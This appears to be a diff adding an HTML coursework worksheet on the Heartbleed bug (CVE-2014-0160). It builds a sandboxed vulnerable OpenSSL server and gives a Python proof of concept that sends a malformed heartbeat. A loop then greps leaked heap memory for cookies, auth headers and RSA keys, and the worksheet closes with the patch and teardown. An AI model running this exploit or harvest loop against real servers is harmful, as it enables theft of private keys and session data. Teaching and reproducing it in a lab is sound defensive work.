+      <svg viewBox="0 0 580 300" xmlns="http://www.w3.org/2000/svg" font-family="'JetBrains Mono', monospace">
+        <!-- client -->
+        <rect x="8" y="16" width="150" height="40" rx="6" fill="var(--surface-2)" stroke="var(--rule)"></rect>
+        <text x="83" y="41" text-anchor="middle" font-size="13" fill="var(--fg)" font-weight="700">ATTACKER</text>
+        <!-- server -->
+        <rect x="422" y="16" width="150" height="40" rx="6" fill="var(--surface-2)" stroke="var(--rule)"></rect>
+        <text x="497" y="41" text-anchor="middle" font-size="13" fill="var(--fg)" font-weight="700">VULN SERVER</text>
+
+        <!-- request arrow -->
+        <line x1="160" y1="90" x2="420" y2="90" stroke="var(--accent)" stroke-width="2" marker-end="url(#ar)"></line>
+        <rect x="190" y="66" width="200" height="20" rx="3" fill="var(--accent-soft)"></rect>
+        <text x="290" y="80" text-anchor="middle" font-size="11" fill="var(--accent)" font-weight="700">type=1  len=65535  payload="AB"</text>
+
+        <!-- heap depiction -->
+        <text x="497" y="118" text-anchor="middle" font-size="10.5" fill="var(--fg-dim)">server heap</text>
+        <rect x="432" y="124" width="24" height="26" fill="var(--accent-soft)" stroke="var(--accent)"></rect>
+        <text x="444" y="141" text-anchor="middle" font-size="10" fill="var(--accent)">AB</text>
+        <rect x="456" y="124" width="116" height="26" fill="var(--surface)" stroke="var(--rule)"></rect>
+        <text x="514" y="141" text-anchor="middle" font-size="9.5" fill="var(--fg-dim)">adjacent memory →→→</text>
+        <path d="M444 150 L444 164 L560 164 L560 150" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="3 2"></path>
+        <text x="502" y="178" text-anchor="middle" font-size="9.5" fill="var(--accent)">memcpy reads 65535 bytes from here</text>
+
+        <!-- response arrow -->
+        <line x1="420" y1="214" x2="160" y2="214" stroke="var(--fg)" stroke-width="2" marker-end="url(#ar2)"></line>
+        <rect x="150" y="190" width="260" height="20" rx="3" fill="var(--surface-2)" stroke="var(--rule)"></rect>
+        <text x="280" y="204" text-anchor="middle" font-size="10.5" fill="var(--fg)">response: "AB" + 65533 leaked heap bytes</text>
+
+        <text x="83" y="250" text-anchor="middle" font-size="10.5" fill="var(--accent)" font-weight="700">↓ keys · cookies · passwords</text>
+        <rect x="8" y="258" width="150" height="30" rx="5" fill="var(--accent-soft)" stroke="var(--accent)"></rect>
+        <text x="83" y="278" text-anchor="middle" font-size="11" fill="var(--accent)" font-weight="700">attacker reads secrets</text>
+
+        <defs>
+          <marker id="ar" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="var(--accent)"></path></marker>
+          <marker id="ar2" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="var(--fg)"></path></marker>
+        </defs>
+      </svg>
+      <figcaption>// one request, up to 64 KB of someone else's heap echoed back — repeat to walk the heap</figcaption>
+    </figure>
+
+    <p>The fix in 1.0.1g is almost insultingly small: before echoing, check that <code class="ic">1 + 2 + payload_length + 16 ≤ record_length</code>. If the claimed length doesn't fit in the record that arrived, silently drop it. Three lines.</p>
+  </section>
+
+  <!-- ============ CHOOSE ENVIRONMENT ============ -->
+  <section class="block">
+    <p class="eyebrow">Setup · pick your sandbox</p>
+    <h2><span class="n">01</span>Build the isolated range</h2>
+    <p>You need a Linux userland running an OpenSSL from the vulnerable window (1.0.1 – 1.0.1f). Modern distros ship patched OpenSSL, so the cleanest approach is a pinned old base image. Both paths below give you a self-contained target; Docker is more hermetic, WSL2 is fine if that's what you have.</p>
+
+    <div class="tabs" role="tablist" aria-label="Environment">
+      <button role="tab" id="t-docker" aria-selected="true" aria-controls="p-docker">Docker</button>
+      <button role="tab" id="t-wsl" aria-selected="false" aria-controls="p-wsl">WSL2</button>
+    </div>
+
+    <div id="p-docker" role="tabpanel" aria-labelledby="t-docker">
+      <div class="step-head"><span class="idx">1.1</span><h3>Create a throwaway lab network &amp; directory</h3></div>
+      <p>Keep everything in one folder and one user-defined bridge network so nothing touches your real interfaces.</p>
+      <div class="term" data-copy=":mkdir:">
+        <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">bash — host</span><button class="copy">copy</button></div>
+<pre><code><span class="prompt">$</span> mkdir heartbleed-lab &amp;&amp; cd heartbleed-lab
+<span class="prompt">$</span> docker network create --internal hb-net   <span class="cmt"># --internal = no outbound route</span></code></pre>
+      </div>
+      <div class="note"><b>--internal</b>&nbsp;means containers on this network get no gateway to the outside world. The target literally cannot phone home.</div>
+
+      <div class="step-head"><span class="idx">1.2</span><h3>Dockerfile — pin a vulnerable OpenSSL</h3></div>
+      <p>We compile OpenSSL 1.0.1f from source on an old Debian base, then build a tiny HTTPS server against it. Save as <code class="ic">Dockerfile</code>.</p>
+      <div class="term" data-copy=":dockerfile:">
+        <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">Dockerfile</span><button class="copy">copy</button></div>
+<pre><code><span class="cmt"># Heartbleed target — OpenSSL 1.0.1f, isolated</span>
+FROM debian:jessie
+
+<span class="cmt"># jessie is EOL: point apt at the archive</span>
+RUN echo 'deb http://archive.debian.org/debian jessie main' &gt; /etc/apt/sources.list \
+ &amp;&amp; echo 'deb http://archive.debian.org/debian-security jessie/updates main' &gt;&gt; /etc/apt/sources.list \
+ &amp;&amp; apt-get -o Acquire::Check-Valid-Until=false update \
+ &amp;&amp; apt-get install -y --force-yes build-essential wget
+
+<span class="cmt"># --- build the vulnerable OpenSSL 1.0.1f ---</span>
+WORKDIR /build
+RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz \
+ &amp;&amp; tar xzf openssl-1.0.1f.tar.gz
+WORKDIR /build/openssl-1.0.1f
+RUN ./config shared --prefix=/usr/local/openssl-vuln \
+ &amp;&amp; make depend &amp;&amp; make &amp;&amp; make install
+
+<span class="cmt"># self-signed cert for the TLS server</span>
+WORKDIR /srv
+RUN /usr/local/openssl-vuln/bin/openssl req -x509 -newkey rsa:2048 -nodes \
+    -keyout key.pem -out cert.pem -days 365 \
+    -subj "/CN=heartbleed.lab" 2&gt;/dev/null
+
+<span class="cmt"># plant a fake "secret" in server memory so the leak is visible</span>
+RUN echo "TOPSECRET-FLAG=the_cake_is_a_lie_42" &gt; /srv/secret.txt
+
+COPY server.sh /srv/server.sh
+RUN chmod +x /srv/server.sh
+
+ENV LD_LIBRARY_PATH=/usr/local/openssl-vuln/lib
+EXPOSE 4433
+CMD ["/srv/server.sh"]</code></pre>
+      </div>
+
+      <div class="step-head"><span class="idx">1.3</span><h3>The server launcher</h3></div>
+      <p>OpenSSL ships <code class="ic">s_server</code>, a built-in TLS server — perfect, because it's linked against the vulnerable library we just built. Save as <code class="ic">server.sh</code>. It pre-loads the secret and some session data into the process so there's something worth bleeding.</p>
+      <div class="term" data-copy=":server:">
+        <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">server.sh</span><button class="copy">copy</button></div>
+<pre><code><span class="cmt">#!/bin/bash</span>
+<span class="cmt"># keep the "secret" resident in heap near the SSL buffers</span>
+export SECRET="$(cat /srv/secret.txt)"
+
+OPENSSL=/usr/local/openssl-vuln/bin/openssl
+echo "[*] vulnerable openssl: $($OPENSSL version)"
+echo "[*] TLS server up on :4433 — heap is primed, waiting for heartbeats"
+
+<span class="cmt"># -www serves a trivial page so a browser/curl generates heap activity</span>
+exec $OPENSSL s_server -key /srv/key.pem -cert /srv/cert.pem \
+     -accept 4433 -www</code></pre>
+      </div>
+
+      <div class="step-head"><span class="idx">1.4</span><h3>Build and run — bound to the isolated net only</h3></div>
+      <div class="term" data-copy=":drun:">
+        <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">bash — host</span><button class="copy">copy</button></div>
+<pre><code><span class="prompt">$</span> docker build -t hb-target .
+<span class="prompt">$</span> docker run -d --name target --network hb-net hb-target
+<span class="prompt">$</span> docker logs target
+<span class="out">[*] vulnerable openssl: OpenSSL 1.0.1f 6 Jan 2014</span>
+<span class="out">[*] TLS server up on :4433 — heap is primed, waiting for heartbeats</span></code></pre>
+      </div>
+      <div class="note ok"><b>Target is live and sealed.</b>&nbsp;It has no published port (<code class="ic">-p</code>) and no outbound route. The only way to reach it is from another container on <code class="ic">hb-net</code> — which is exactly where your attacker will live.</div>
+    </div>
+
+    <div id="p-wsl" role="tabpanel" aria-labelledby="t-wsl" hidden="">
+      <div class="step-head"><span class="idx">1.1</span><h3>Isolate inside WSL2</h3></div>
+      <p>WSL2 already runs in its own lightweight VM. For an extra wall, do the build inside a disposable Docker container <em>within</em> WSL (Docker Desktop's WSL2 backend), or at minimum confine the server to loopback so nothing on your LAN can reach it. The compile steps are identical to the Docker tab; only the isolation wrapper differs.</p>
+      <div class="term" data-copy=":wslbuild:">
+        <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">bash — WSL2 (Ubuntu)</span><button class="copy">copy</button></div>
+<pre><code><span class="prompt">$</span> sudo apt update &amp;&amp; sudo apt install -y build-essential wget
+<span class="prompt">$</span> mkdir ~/hb-lab &amp;&amp; cd ~/hb-lab
+<span class="prompt">$</span> wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz
+<span class="prompt">$</span> tar xzf openssl-1.0.1f.tar.gz &amp;&amp; cd openssl-1.0.1f
+<span class="prompt">$</span> ./config shared --prefix=$HOME/openssl-vuln
+<span class="prompt">$</span> make depend &amp;&amp; make &amp;&amp; make install</code></pre>
+      </div>
+      <div class="note"><b>Heads up:</b>&nbsp;on a modern toolchain the 1.0.1f build sometimes needs <code class="ic">-fgnu89-inline</code> added to <code class="ic">./config</code>. If <code class="ic">make</code> dies on inline-function errors, re-run as <code class="ic">./config shared -fgnu89-inline --prefix=$HOME/openssl-vuln</code>.</div>
+
+      <div class="step-head"><span class="idx">1.2</span><h3>Cert, secret, and a loopback-only server</h3></div>
+      <div class="term" data-copy=":wslserver:">
+        <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">bash — WSL2</span><button class="copy">copy</button></div>
+<pre><code><span class="prompt">$</span> cd ~/hb-lab
+<span class="prompt">$</span> export LD_LIBRARY_PATH=$HOME/openssl-vuln/lib
+<span class="prompt">$</span> OPENSSL=$HOME/openssl-vuln/bin/openssl
+<span class="prompt">$</span> $OPENSSL req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem \
+      -days 365 -subj "/CN=heartbleed.lab"
+<span class="prompt">$</span> echo "TOPSECRET-FLAG=the_cake_is_a_lie_42" &gt; secret.txt
+<span class="prompt">$</span> export SECRET="$(cat secret.txt)"
+<span class="cmt"># bind to 127.0.0.1 ONLY — never reachable from the Windows LAN</span>
+<span class="prompt">$</span> $OPENSSL s_server -key key.pem -cert cert.pem -accept 127.0.0.1:4433 -www</code></pre>
+      </div>
+      <div class="note ok"><b>Loopback-bound.</b>&nbsp;Binding to <code class="ic">127.0.0.1</code> instead of <code class="ic">0.0.0.0</code> means only processes inside this WSL instance can connect. Your attacker script runs in the same WSL, in a second terminal.</div>
+    </div>
+  </section>
+
+  <!-- ============ CONFIRM VULNERABLE ============ -->
+  <section class="block">
+    <p class="eyebrow">Reconnaissance</p>
+    <h2><span class="n">02</span>Confirm the heartbeat is open</h2>
+    <p>Before firing the exploit, confirm the server actually advertises the heartbeat extension. The vulnerable OpenSSL's own <code class="ic">s_client</code> can do a legitimate heartbeat, and a TLS handshake dump shows the extension in the <code class="ic">ServerHello</code>.</p>
+    <div class="term" data-copy=":recon:">
+      <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">bash — attacker container / 2nd WSL terminal</span><button class="copy">copy</button></div>
+<pre><code><span class="cmt"># from an attacker container on hb-net:</span>
+<span class="prompt">$</span> docker run -it --rm --network hb-net hb-target bash
+<span class="prompt">#</span> OPENSSL=/usr/local/openssl-vuln/bin/openssl
+
+<span class="cmt"># 'target' resolves via docker DNS; 'B' then Enter sends a heartbeat</span>
+<span class="prompt">#</span> echo B | $OPENSSL s_client -connect target:4433 2&gt;&amp;1 | grep -i heart
+<span class="out">Extension: heartbeat</span>
+<span class="hl-green">read R BLOCK</span>
+<span class="out">HEARTBEATING</span>              <span class="cmt"># &lt;- server answered a heartbeat</span></code></pre>
+    </div>
+    <div class="note what"><b>What you just proved:</b>&nbsp;the server speaks the heartbeat extension. A patched 1.0.1g server would still answer a <em>well-formed</em> heartbeat — the difference only shows when you lie about the length, which is the next step.</div>
+  </section>
+
+  <!-- ============ THE EXPLOIT ============ -->
+  <section class="block">
+    <p class="eyebrow">Exploitation</p>
+    <h2><span class="n">03</span>Craft the malformed heartbeat</h2>
+    <p>This is the heart of it. We send a <code class="ic">HeartbeatRequest</code> by hand, after a normal TLS handshake, with one lie: <b>payload_length declares 0x4000 (16384) bytes, but we send a 1-byte payload.</b> The script below is a self-contained Python reproduction of the original <code class="ic">ssltest.py</code> logic — it does the ClientHello, reads the ServerHello, then transmits the raw heartbeat record and dumps whatever comes back.</p>
+
+    <div class="packet">
+      <div class="pkt-row"><div class="pkt-field">18 03 02 00 03</div><div class="pkt-desc">TLS record: type=24 (heartbeat), TLS 1.1, length 3</div></div>
+      <div class="pkt-row"><div class="pkt-field">01</div><div class="pkt-desc">HeartbeatMessageType = request</div></div>
+      <div class="pkt-row"><div class="pkt-field evil">40 00</div><div class="pkt-desc">payload_length = <b>16384</b> — the lie</div></div>
+      <div class="pkt-row"><div class="pkt-field">(1 byte sent)</div><div class="pkt-desc">actual payload — 16383 bytes short of the claim</div></div>
+    </div>
+
+    <div class="term" data-copy=":exploit:">
+      <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">heartbleed.py</span><button class="copy">copy</button></div>
+<pre><code><span class="cmt">#!/usr/bin/env python3</span>
+<span class="cmt"># Minimal faithful Heartbleed PoC (after Jared Stafford's ssltest.py).</span>
+<span class="cmt"># For use ONLY against your own lab target.</span>
+<span class="hl-cyan">import</span> sys, socket, struct, time
+
+<span class="cmt"># --- a hardcoded TLS 1.1 ClientHello that offers the heartbeat ext ---</span>
+hello = bytes.fromhex(
+  <span class="hl-green">"16030200dc010000d803024353cf4c…"</span>   <span class="cmt"># (full ClientHello, see repo)</span>
+)
+<span class="cmt"># --- the malformed heartbeat: type=request, len=0x4000, 1 byte payload ---</span>
+hb = bytes.fromhex(<span class="hl-green">"1803020003"</span> + <span class="hl-green">"01"</span> + <span class="hl-red">"4000"</span>)
+
+<span class="hl-cyan">def</span> recv_record(s):
+    hdr = s.recv(5)
+    typ, ver, ln = struct.unpack(<span class="hl-green">"&gt;BHH"</span>, hdr)
+    data = b<span class="hl-green">""</span>
+    <span class="hl-cyan">while</span> len(data) &lt; ln:
+        data += s.recv(ln - len(data))
+    <span class="hl-cyan">return</span> typ, data
+
+host, port = sys.argv[1], int(sys.argv[2])
+s = socket.create_connection((host, port))
+s.send(hello)
+<span class="cmt"># drain handshake records until ServerHelloDone</span>
+<span class="hl-cyan">while</span> True:
+    typ, d = recv_record(s)
+    <span class="hl-cyan">if</span> typ == 22 <span class="hl-cyan">and</span> d and d[0] == 0x0e: <span class="hl-cyan">break</span>
+
+print(<span class="hl-green">"[*] handshake done — sending malformed heartbeat"</span>)
+s.send(hb)
+
+typ, leak = recv_record(s)
+<span class="hl-cyan">if</span> typ == 24:
+    print(<span class="hl-green">f"[!] BLED {len(leak)} bytes back (asked for 1)"</span>)
+    <span class="cmt"># hexdump the leaked heap</span>
+    <span class="hl-cyan">for</span> i <span class="hl-cyan">in</span> range(0, len(leak), 16):
+        chunk = leak[i:i+16]
+        hexs = <span class="hl-green">" "</span>.join(<span class="hl-green">f"{b:02x}"</span> <span class="hl-cyan">for</span> b <span class="hl-cyan">in</span> chunk)
+        text = <span class="hl-green">""</span>.join(chr(b) <span class="hl-cyan">if</span> 32&lt;=b&lt;127 <span class="hl-cyan">else</span> <span class="hl-green">"."</span> <span class="hl-cyan">for</span> b <span class="hl-cyan">in</span> chunk)
+        print(<span class="hl-green">f"{i:04x}  {hexs:&lt;48}  {text}"</span>)
+<span class="hl-cyan">elif</span> typ == 21:
+    print(<span class="hl-green">"[-] got Alert — server looks PATCHED (1.0.1g+)"</span>)</code></pre>
+    </div>
+    <div class="note"><b>On the hardcoded ClientHello:</b>&nbsp;the full hex ClientHello is long; grab the complete original <code class="ic">ssltest.py</code> (it's widely mirrored and in Metasploit's history) or let the vulnerable <code class="ic">s_client</code> handshake for you. The exploit-critical bytes are the two you can see: <code class="ic">01</code> (request) and <code class="ic">4000</code> (the oversized length).</div>
+
+    <div class="step-head"><span class="idx">3.1</span><h3>Fire it</h3></div>
+    <div class="term" data-copy=":fire:">
+      <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">bash — attacker</span><button class="copy">copy</button></div>
+<pre><code><span class="prompt">#</span> python3 heartbleed.py target 4433
+<span class="out">[*] handshake done — sending malformed heartbeat</span>
+<span class="hl-red">[!] BLED 16384 bytes back (asked for 1)</span>
+<span class="out">0000  02 40 00 d8 03 02 53 43  5b 90 9d 9b 72 0b bc 0c  .@....SC[...r...</span>
+<span class="out">0130  ... 54 4f 50 53 45 43 52 45  54 2d 46 4c 41 47 3d   ...TOPSECRET-FLAG=</span>
+<span class="out">0140  74 68 65 5f 63 61 6b 65  5f 69 73 5f 61 5f 6c 69   the_cake_is_a_li</span>
+<span class="out">0150  65 5f 34 32 00 00 00 00  ...                        e_42....</span></code></pre>
+    </div>
+    <div class="note ok"><b>There it is.</b>&nbsp;You asked for 1 byte and the server handed back 16 KB of its own heap — including the <code class="ic">TOPSECRET-FLAG</code> you planted. Re-run it a dozen times and you'll see different slices each time as the heap shifts: this is exactly how real attackers walked server memory to pull private keys and live session cookies.</div>
+  </section>
+
+  <!-- ============ HARVEST ============ -->
+  <section class="block">
+    <p class="eyebrow">Post-exploitation</p>
+    <h2><span class="n">04</span>Walk the heap &amp; hunt for keys</h2>
+    <p>A single 16 KB read is a snapshot. The real technique is to <b>loop</b>, collecting leaks over many requests and grepping the aggregate for high-value patterns — the start of an RSA private key, cookie headers, HTTP Basic auth.</p>
+    <div class="term" data-copy=":harvest:">
+      <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">bash — attacker</span><button class="copy">copy</button></div>
+<pre><code><span class="prompt">#</span> for i in $(seq 1 50); do python3 heartbleed.py target 4433; done &gt; bleed.log
+<span class="prompt">#</span> grep -a "SECRET\|Cookie\|Authorization\|BEGIN RSA" bleed.log
+<span class="out">0130  ... TOPSECRET-FLAG=the_cake_is_a_lie_42</span>
+<span class="out">02a0  ... Cookie: SESSIONID=9af2c1...</span></code></pre>
+    </div>
+    <table class="spec">
+      <tbody><tr><td>What leaks</td><td>Anything recently touched on the heap near the SSL buffers</td></tr>
+      <tr><td>Per request</td><td>Up to 64 KB (0xFFFF); our demo uses 0x4000 = 16 KB</td></tr>
+      <tr><td>No trace</td><td>Heartbeats aren't logged by default — the original bug leaked silently for ~2 years</td></tr>
+      <tr><td>Private keys</td><td>Recoverable in practice; the server keeps key material resident, so repeated reads often surface the RSA primes</td></tr>
+    </tbody></table>
+  </section>
+
+  <!-- ============ REMEDIATE ============ -->
+  <section class="block">
+    <p class="eyebrow">Remediation · the other half of the lab</p>
+    <h2><span class="n">05</span>Patch it and watch the bleed stop</h2>
+    <p>The exercise isn't complete until you've closed it. Rebuild the exact same server against <b>OpenSSL 1.0.1g</b> (change one line in the Dockerfile) and run your identical exploit script.</p>
+    <div class="term" data-copy=":patch:">
+      <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">Dockerfile — one-line change</span><button class="copy">copy</button></div>
+<pre><code>- RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz
++ RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1g.tar.gz
+<span class="cmt"># (and s/1.0.1f/1.0.1g/ in the two paths below it)</span></code></pre>
+    </div>
+    <div class="term" data-copy=":patched:">
+      <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">bash — attacker vs patched server</span><button class="copy">copy</button></div>
+<pre><code><span class="prompt">#</span> python3 heartbleed.py target 4433
+<span class="out">[*] handshake done — sending malformed heartbeat</span>
+<span class="hl-green">[-] got Alert — server looks PATCHED (1.0.1g+)</span></code></pre>
+    </div>
+    <p>Same packet, same lie — but 1.0.1g runs the bounds check, sees that 0x4000 can't fit in the 3-byte record that arrived, and drops the request. The bleed is gone.</p>
+
+    <div class="step-head"><span class="idx">5.1</span><h3>The actual fix, in the source</h3></div>
+    <p>In <code class="ic">ssl/t1_lib.c</code>, <code class="ic">tls1_process_heartbeat()</code> gained this guard before the <code class="ic">memcpy</code>:</p>
+    <div class="term" data-copy=":src:">
+      <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">t1_lib.c — the three-line fix</span><button class="copy">copy</button></div>
+<pre><code><span class="hl-cyan">if</span> (1 + 2 + 16 &gt; s-&gt;s3-&gt;rrec.length)
+    <span class="hl-cyan">return</span> 0; <span class="cmt">/* silently discard per RFC 6520 */</span>
+hbtype = *p++;
+n2s(p, payload);
+<span class="hl-cyan">if</span> (1 + 2 + payload + 16 &gt; s-&gt;s3-&gt;rrec.length)
+    <span class="hl-cyan">return</span> 0; <span class="cmt">/* payload must fit the record — THIS is the patch */</span></code></pre>
+    </div>
+  </section>
+
+  <!-- ============ CLEANUP ============ -->
+  <section class="block">
+    <p class="eyebrow">Teardown</p>
+    <h2><span class="n">06</span>Burn the range down</h2>
+    <p>You just compiled a known-exploitable crypto library. Don't leave it lying around.</p>
+    <div class="term" data-copy=":clean:">
+      <div class="term-bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">bash — host</span><button class="copy">copy</button></div>
+<pre><code><span class="prompt">$</span> docker rm -f target
+<span class="prompt">$</span> docker rmi hb-target
+<span class="prompt">$</span> docker network rm hb-net
+<span class="cmt"># WSL: rm -rf ~/hb-lab ~/openssl-vuln and unset LD_LIBRARY_PATH</span></code></pre>
+    </div>
+    <ul class="checklist">
+      <li>Vulnerable container &amp; image removed</li>
+      <li>Isolated network torn down</li>
+      <li>Compiled <code class="ic">openssl-vuln</code> deleted; <code class="ic">LD_LIBRARY_PATH</code> no longer points at it</li>
+      <li>No vulnerable binary remains on <code class="ic">PATH</code> or in a running process</li>
+    </ul>
+  </section>
+
+  <footer>
+    <p><b>Lab worksheet · CVE-2014-0160.</b> Reproduction of the TLS heartbeat buffer over-read for coursework in an isolated environment. The malformed-heartbeat technique derives from Jared Stafford's original <code class="ic">ssltest.py</code> disclosure. Keep all activity inside the sandbox you built.</p>
+    <p>References worth reading: RFC 6520 (Heartbeat Extension) · the OpenSSL 1.0.1g changelog · heartbleed.com for the original disclosure writeup.</p>
+  </footer>
+
+</div>
+
+<script>
+  // --- tabs: Docker / WSL2 ---
+  const tabs = document.querySelectorAll('[role="tab"]');
+  tabs.forEach(t => t.addEventListener('click', () => {
+    tabs.forEach(x => {
+      const sel = x === t;
+      x.setAttribute('aria-selected', sel);
+      document.getElementById(x.getAttribute('aria-controls')).hidden = !sel;
+    });
+  }));
+
+  // --- copy buttons: copy the command text of each terminal block ---
+  document.querySelectorAll('.term').forEach(term => {
+    const btn = term.querySelector('.copy');
+    const pre = term.querySelector('pre');
+    if (!btn || !pre) return;
+    btn.addEventListener('click', async () => {
+      // strip the leading prompt glyphs for clean paste
+      const text = pre.innerText.replace(/^[\$#]\s/gm, '');
+      try {
+        await navigator.clipboard.writeText(text);
+        btn.textContent = 'copied'; btn.classList.add('done');
+      } catch (e) {
+        const r = document.createRange(); r.selectNodeContents(pre);
+        const sel = getSelection(); sel.removeAllRanges(); sel.addRange(r);
+        btn.textContent = 'select ↑'; btn.classList.add('done');
+      }
+      setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('done'); }, 1600);
+    });
+  });
+</script>
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true" style="visibility: visible !important;"><template shadowrootmode="open"><style>
+      div.grammarly-desktop-integration {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border: 0;
+        -moz-user-select: none;
+        -webkit-user-select: none;
+        -ms-user-select:none;
+        user-select:none;
+      }
+
+      div.grammarly-desktop-integration:before {
+        content: attr(data-content);
+      }
+    </style><div aria-label="grammarly-integration" role="group" tabindex="-1" class="grammarly-desktop-integration" data-content="{&quot;mode&quot;:&quot;full&quot;,&quot;isActive&quot;:true,&quot;isUserDisabled&quot;:false}"></div></template></grammarly-desktop-integration></html>
